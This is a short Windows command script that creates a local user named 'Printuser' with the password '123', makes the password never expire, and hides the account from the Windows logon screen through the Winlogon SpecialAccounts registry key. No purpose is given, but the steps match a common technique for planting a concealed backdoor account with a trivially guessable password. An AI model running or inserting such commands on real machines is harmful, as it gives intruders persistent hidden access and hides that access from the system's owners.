net user Printuser 123 /add
wmic UserAccount where Name="Printuser" set PasswordExpires=False
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Printuser /t REG_DWORD /d 0
